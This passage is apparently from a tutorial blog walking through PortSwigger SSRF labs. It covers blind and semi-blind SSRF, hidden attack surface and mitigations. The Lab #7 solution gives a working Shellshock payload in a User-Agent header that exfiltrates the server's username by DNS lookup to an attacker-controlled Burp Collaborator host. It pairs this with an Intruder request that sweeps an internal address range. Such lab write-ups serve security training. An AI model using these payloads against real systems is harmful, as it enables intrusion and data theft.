> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
> Referer: https://pf80y51u0yfhmb9wjifate12zt5jt8.oastify.com/
> ```
> Alternatively, services like [interactsh](https://app.interactsh.com/#/) can be used, which provide a random URL instance and display the response when someone connects to it. However, in this lab, we need to use the Burp Collaborator instance to solve the task.
> </details>

As already mentioned simply seeing blind SSRF vulnerability doesn't means its a big impact in all the black box cases because we cannot guess the route that can be exploited since we cannot view the response from the back-end request, the behavior can't be used to explore content on systems that the application server can reach. 

However, blind SSRF can still be utilized to explore other vulnerabilities not only on the server itself but also on other back-end systems. By blindly sweeping the internal IP address space and sending payloads specifically designed to detect well-known vulnerabilities, you may uncover critical vulnerabilities on unpatched internal servers. This could include vulnerabilities like Shell Shock or Log4jshell that can potentially result in remote code execution. Detecting these vulnerabilities in a blind manner can be challenging and time-consuming. It's important to note that zero-day vulnerabilities and other vulnerabilities are continuously being discovered, so staying updated with modern attack methodologies is crucial in order to exploit these vulnerabilities effectively.

### LAB #7: Blind SSRF With Shellshock Exploitation

Lab URL: [https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)

**Objective**

This lab contains analytics software that fetches the URL specified in the Referer header when the product page is loaded. Use this functionality to make requests to the internal network in the `192.168.0.x` address range on port `8080`. Use shellshock payload that exfiltrates the name of the user to an attacker-controlled server(Burp Collaborator).

> <details>
> <summary>**Solution**</summary>
>
> This lab is a continuation of our previous Blind SSRF lab. In this lab, we focus on exploiting the Shellshock vulnerability through the Referer header. The objective is to execute system commands and exfiltrate the server's username using a Shellshock payload.
> The Shellshock payload used is as follows:
> ```
> () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
> ```
> To exploit the vulnerability, we need to include this payload in the User-Agent header due to the nature of the Shellshock vulnerability. In Burp Intruder, we can send the request with the modified Referer header, such as http://192.168.0.1:8080, and specify the position of the octet we want to change. We set the attack type to Sniper, payload type to Number and the range between 1 and 255 with a step of 1 and max fraction digit set to 0. The complete request in the Intruder looks like the following:
> ```
> GET /product?productId=1 HTTP/2
> Host: 0aaf00b0031373578171a8cf008300e7.web-security-academy.net
> Cookie: session=rCCnDicDDiuaVaH9n1GAAFTzXAbJsCHb
> User-Agent: () { :; }; /usr/bin/nslookup $(whoami).hbw31oikrl165hj4oxa2fmi3cuik69.oastify.com
> Referer: http://192.168.0.§x§:8080
> ```
> Initiate the Intruder attack, and you will observe a callback in your Burp Collaborator instance. The DNS query is made, revealing the username peter-Q9WC9L. This confirms the successful execution of the command on the server. Submit the obtained username from your Burp Collaborator instance to complete this lab.
> </details>

Blind SSRF vulnerabilities can also be exploited by manipulating the application to establish connections with a system controlled by the attacker. By doing so, the attacker can craft malicious responses that are returned to the HTTP client initiating the connection. If the attacker can identify and exploit a critical vulnerability on the client side of the server's HTTP implementation, it may be possible to execute remote code within the application's infrastructure. This can lead to significant compromise and potential control over the affected system.

This type of vulnerability is rare than other mentioned vulnerabilities but they exist so let's try to understand it with a simple example scenario.

Let's say there is a web application that allows users to input a URL to fetch data from external resources. However, due to server-side filtering and restrictions, only certain whitelisted URLs are allowed.

We are able to identify a blind SSRF vulnerability in this application. We craft a malicious URL pointing to a system under their control. When the server makes the request to the specified URL, We intercept it and respond with a specially crafted payload.

The payload is designed to exploit a known vulnerability in the server's HTTP client implementation, such as a buffer overflow or code injection vulnerability. By carefully constructing the payload, we can trigger remote code execution within the application's infrastructure.

As you can see in the above example scenario client-side implementation can be leveraged to get high impact but finding those in a black box perspective is so difficult.

## Sami Blind SSRF

Sami Blind SSRF vulnerability case arises when we have limited visibility or control over the responses from the server. This means that we cannot directly observe the responses to determine if our request was successful. Instead, we need to rely on indirect indicators, such as the response time or length, to infer the outcome.

For instance, let's consider a scenario where we have a blind SSRF situation, but the server does not provide us with the response directly. However, we can observe that the server processes requests and responses sequentially. In this situation, we can use techniques like port scanning on the network to gather information. If a port is open, the server will take longer to respond, while if the port is closed, the server will respond more quickly. This type of scenario is referred to as Sami Blind SSRF.

In Sami Blind SSRF, we cannot directly see the response, but we can make educated guesses based on the timing or length of the server's responses. By analyzing these indicators, we can gain some insight into the success or failure of our requests.

It's important to note that Sami Blind SSRF poses its own challenges, as it requires careful observation and analysis of the server's behavior to draw meaningful conclusions. However, even without full visibility into the responses, attackers can still leverage Sami Blind SSRF to gather information, probe for vulnerabilities, or attempt to bypass security measures as we explain above.

## Finding Hidden Attack Surface Of SSRF Attacks

Server-side request forgery (SSRF) vulnerabilities can be easy to spot when request parameters contain full URLs, but other examples of SSRF are more difficult to locate such as.

**Partial URLs in requests**
Some applications only include a hostname or part of a URL path in request parameters, which are then combined server-side into a full URL for the request. Exploitability as full SSRF may be limited since the attacker does not control the entire URL.

**URLs within data formats**
Applications that transmit data in formats like XML may be vulnerable to SSRF via XXE injection. The inclusion of URLs in the data can lead to requests being made by the data parser, potentially enabling SSRF.

**SSRF via the Referer header**
Applications using server-side analytics software often log the Referer header, including any third-party URLs. The analytics software may visit these URLs to analyze referring sites, making the Referer header a potential attack surface for SSRF vulnerabilities.

## Conclusion

In conclusion, SSRF (Server-Side Request Forgery) attacks pose a significant threat to web applications. These attacks exploit the ability of an application to make requests to internal or external resources on behalf of the attacker. SSRF vulnerabilities can lead to various risks, such as unauthorized data access, server-side reconnaissance, and even remote code execution.

To mitigate SSRF attacks, it is crucial to implement proper input validation and filtering. Whitelisting trusted URLs, implementing strict access controls, and validating user-supplied input are important defensive measures. Additionally, using robust URL parsers and implementing strong network segmentation can help minimize the impact of SSRF vulnerabilities.

Continuous monitoring, testing, and staying updated on emerging vulnerabilities and best practices are essential in maintaining the security of web applications and protecting against SSRF attacks. By adopting a proactive approach to security, organizations can reduce the risk of SSRF exploits and safeguard sensitive data and infrastructure.

**Interesting Articles related to SSRF attacks**
- [https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient](https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface)
